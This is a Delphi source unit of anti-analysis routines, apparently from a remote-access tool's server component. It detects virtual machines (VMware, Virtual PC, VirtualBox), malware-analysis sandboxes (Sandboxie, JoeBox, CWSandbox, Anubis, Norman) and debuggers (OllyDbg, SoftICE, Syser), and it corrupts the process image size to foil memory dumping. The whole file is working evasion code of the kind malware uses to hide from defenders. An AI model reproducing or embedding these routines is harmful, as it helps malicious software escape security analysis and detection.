Unit UnitSandBox;

interface

uses
  windows, 
  TLhelp32,
  UnitServerUtils;

function InVMware: Boolean;
function IsInVPC: boolean; assembler;
function InVirtualBox: boolean;
function Sandboxie: boolean;
function ThreadExpert: boolean;
function JoeBox: boolean;
function CWSandbox: boolean;
function Anubis: boolean;
function NormanSandBox: boolean;
function IsODBGLoaded: Boolean; //OllyDBG
function IsBPX(address: pointer): boolean; //CheckBreakPoint
procedure FoolProcDump;
function SyserDebugger: boolean;
function IsSoftIce: boolean;
function IsInDebugger: boolean;

implementation

function InVMware: Boolean;
asm
    XOR     EAX, EAX
 
    PUSH    OFFSET @@Handler
    PUSH    DWORD PTR FS:[EAX]
    MOV     DWORD PTR FS:[EAX], ESP
    MOV     EAX, 564D5868h
    MOV     EBX, 3c6cf712h
    MOV     ECX, 0Ah
    MOV     DX, 5658h
    IN      EAX, DX
    MOV     EAX, True
    JMP     @@NotHandle
@@Handler:
    MOV     EAX, [ESP+$C]
    MOV     TContext(EAX).EIP, OFFSET @@Handled
    XOR     EAX, EAX
    RET
@@Handled:
    XOR     EAX, EAX
@@NotHandle:
    XOR     EBX, EBX
    POP     DWORD PTR FS:[EBX]
    ADD     ESP, 4
end;

function IsInVPC: boolean; assembler;
asm
  push ebp

  mov  ecx, offset @@exception_handler
  mov  ebp, esp

  push ebx
  push ecx
  push dword ptr fs:[0]
  mov  dword ptr fs:[0], esp

  mov  ebx, 0 // flag
  mov  eax, 1 // VPC function number

  // call VPC
  db 00Fh, 03Fh, 007h, 00Bh

  mov eax, dword ptr ss:[esp]
  mov dword ptr fs:[0], eax
  add esp, 8

  test ebx, ebx
  setz al
  lea esp, dword ptr ss:[ebp-4]
  mov ebx, dword ptr ss:[esp]
  mov ebp, dword ptr ss:[esp+4]
  add esp, 8
  jmp @@ret
  @@exception_handler:
  mov ecx, [esp+0Ch]
  mov dword ptr [ecx+0A4h], -1
  add dword ptr [ecx+0B8h], 4
  xor eax, eax
  ret
  @@ret:
end;

function InVirtualBox: boolean;
var
  handle: THandle;
  procinfo: ProcessEntry32;
begin
  result := false;
  handle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  procinfo.dwSize := sizeof(PROCESSENTRY32);

  while(Process32Next(handle, procinfo)) do
  begin
    if pos(pchar(upperstring('VBoxService.exe')), upperstring(procinfo.szExeFile)) > 0 then
    begin
      CloseHandle(handle);
      result := true;
      exit;
    end;
  end;
  CloseHandle(handle);
end;

function Sandboxie: boolean;
var
  hMod:THandle;
begin
  Result := False;
  hMod:= GetModuleHandle(pchar('SbieDll.dll'));
  if hMod <> 0 then Result := True;
end;

function ThreadExpert: boolean;
var
  hMod:THandle;
begin
  Result := False;
  hMod:= GetModuleHandle(pchar('dbghelp.dll'));
  if hMod <> 0 then Result := True;
end;

function JoeBox: boolean;
var
  hOpen:    hkey;
  sBuff:    array[0..256] of char;
  BuffSize: integer;
begin
  Result := false;
  if RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion'), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS then
  begin
    BuffSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar('ProductId'), nil, nil, @sBuff, @BuffSize);
    if sBuff = pchar('55274-640-2673064-23950') then Result := True
  end;
  RegCloseKey(hOpen);
end;

function CWSandbox: boolean;
var
  hOpen:    hkey;
  sBuff:    array[0..256] of char;
  BuffSize: integer;
begin
  Result := false;
  if RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion'), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS then
  begin
    BuffSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar('ProductId'), nil, nil, @sBuff, @BuffSize);
    if sBuff = pchar('76487-644-3177037-23510') then Result := True
  end;
  RegCloseKey(hOpen);
end;

function Anubis: boolean;
var
  hOpen:    hkey;
  sBuff:    array[0..256] of char;
  BuffSize: integer;
begin
  Result := false;
  if RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar('Software\Microsoft\Windows\CurrentVersion'), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS then
  begin
    BuffSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar('ProductId'), nil, nil, @sBuff, @BuffSize);
    if sBuff = pchar('76487-337-8429955-22614') then Result := True
  end;
  RegCloseKey(hOpen);
end;

function NormanSandBox: boolean;
var
  bSize :Cardinal;
  Str: string;
begin
  result := false;
  try
    bSize := 256;
    SetLength(Str, bSize);
    GetUserName(PChar(Str), bSize);
  except
    Str := '';
  end;
  result := UpperString(str) = UpperString('CurrentUser');
end;

function IsDebuggerPresent: Boolean;
type
  TDebugProc = function(): Boolean; stdCall;
var
  FMODULE: HMODULE;
  Proc: TDebugProc;
begin
  Result  := False;
  FMODULE := LoadLibrary('kernel32.dll');
  if (FMODULE <> 0) then
  begin
    @Proc := GetProcAddress(FMODULE, 'IsDebuggerPresent');
    if Assigned(Proc) then Result := Proc();
  end;
end;

function IsDebug: Boolean;
var
  YInt, NInt: Integer;
begin
  asm
    mov   eax,fs:[30h]
    movzx   eax,byte   ptr[eax+2h]
    or   al,al
    jz   @No
    jnz   @Yes
  @No:
    mov   NInt,1
  @Yes:
    Mov   YInt,1
  end;
    if YInt = 1 then result := true;
    if NInt = 1 then result := false;
end;

function IsInDebugger: boolean;
begin
  result := false;
  if (IsDebuggerPresent = true) or (IsDebug = true) then result := true;
end;

function IsODBGLoaded: Boolean; //OllyDBG
var
  caption :string;
label
  normal_, out_;
begin
  caption := 'DAEMON';
  asm
    push $00
    push caption

    mov eax, fs:[30h]
    movzx eax, byte ptr[eax+$2]
    or al,al
    jz normal_
    jmp out_
  normal_:
    xor eax, eax
    leave
    ret
  out_:
    mov eax, $1
    leave
    ret
  end;
end;

function IsBPX(address: pointer): boolean; //CheckBreakPoint
label
  BPXed, NOBPX;
begin
  result := false;
  asm
    mov esi, address   // load function address
    mov al, [esi]      // load the opcode
    cmp al, $CC        // check if the opcode is CCh
    je BPXed           // yes, there is a breakpoint

    // jump to return true
    xor eax, eax       // false,
    jmp NOBPX          // no breakpoint
  BPXed:
    mov eax, 1         // breakpoint found
  NOBPX:
  end;
end;

procedure FoolProcDump;
asm
  mov eax, fs:[$30]
  mov eax, [eax+$C]
  mov eax, [eax+$C]
  add dword ptr [eax+$20], $2000
end;

Function Check_Syser(ID:PChar): boolean;
var
  hFile: Thandle;
begin
  result := false;
  hFile := CreateFileA(id, GENERIC_READ or GENERIC_WRITE,
    FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, 0);
  if( hFile <> INVALID_HANDLE_VALUE ) then
  begin
    CloseHandle(hFile);
    result := true;
  end;
end;

function SyserDebugger: boolean;
begin
  result := false;
  if (Check_Syser('\\.\Syser')) or
     (Check_Syser('\\.\SyserDbgMsg')) or
     (Check_Syser('\\.\SyserBoot')) then result := true;
end;

Function IsSoftIce95Loaded: boolean;
var
  hFile: Thandle;
Begin
  result := false;
  hFile := CreateFileA('\\.\SICE', GENERIC_READ or GENERIC_WRITE,
    FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, 0);
  if( hFile <> INVALID_HANDLE_VALUE ) then
  begin
    CloseHandle(hFile);
    result := TRUE;
  end;
end;

Function IsSoftIceNTLoaded: boolean;
var
  hFile: Thandle;
begin
  result := false;
  hFile := CreateFileA('\\.\NTICE', GENERIC_READ or GENERIC_WRITE,
    FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, 0);
  if( hFile <> INVALID_HANDLE_VALUE ) then
  begin
    CloseHandle(hFile);
    result := TRUE;
  end;
end;

function IsSoftIce: boolean;
begin
  result := false;
  if (IsSoftIce95Loaded = true) or (IsSoftIceNTLoaded = true) then result := true;
end;

end.

